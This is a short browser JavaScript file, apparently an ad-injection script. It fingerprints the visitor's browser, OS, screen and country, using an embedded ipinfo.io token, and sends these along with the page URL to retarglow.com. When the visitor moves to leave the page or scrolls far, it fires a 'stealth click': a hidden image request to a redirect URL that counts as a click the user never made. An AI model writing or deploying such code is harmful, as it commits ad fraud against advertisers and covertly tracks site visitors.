(async function () {
  const endpoint = "https://retarglow.com/getad";
  const redirectBase = "https://retarglow.com/redirect";

  function getClientMeta() {
    const ua = navigator.userAgent;
    const isMobile = /Mobi|Android/i.test(ua);
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const browser = (() => {
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      return "Other";
    })();
    const os = (() => {
      if (/Win/i.test(ua)) return "Windows";
      if (/Mac/i.test(ua)) return "MacOS";
      if (/Linux/i.test(ua)) return "Linux";
      if (/Android/i.test(ua)) return "Android";
      if (/iOS|iPhone|iPad/i.test(ua)) return "iOS";
      return "Other";
    })();
    return {
      b: browser,
      os,
      sr: screenRes,
      dt: isMobile ? "M" : "D"
    };
  }

  const pageUrl = window.location.href;
  const cm = getClientMeta();

  let country = null;
  try {
    const geoRes = await fetch("https://ipinfo.io/json?token=d9a93a74769916");
    const geoData = await geoRes.json();
    country = geoData.country || null;
  } catch (e) {}

  const adResponse = await fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ u: pageUrl, cm, country })
  });

  const { ad_url } = await adResponse.json();
  if (!ad_url) return;

  const adId = new URL(ad_url).searchParams.get("subId1") || "yoho";

  function fireStealthClick(adId) {
    const img = new Image();
    img.src = `${redirectBase}?ad_id=${encodeURIComponent(adId)}&t=${Date.now()}`;
    img.style.display = "none";
    document.body.appendChild(img);
  }

  let triggered = false;

  function handleTrigger() {
    if (triggered) return;
    triggered = true;
    fireStealthClick(adId);
  }

  document.addEventListener("mouseleave", (e) => {
    if (e.clientY <= 0) handleTrigger();
  });

  document.addEventListener("scroll", () => {
    if (window.scrollY > window.innerHeight * 1.2) handleTrigger();
  });
})();
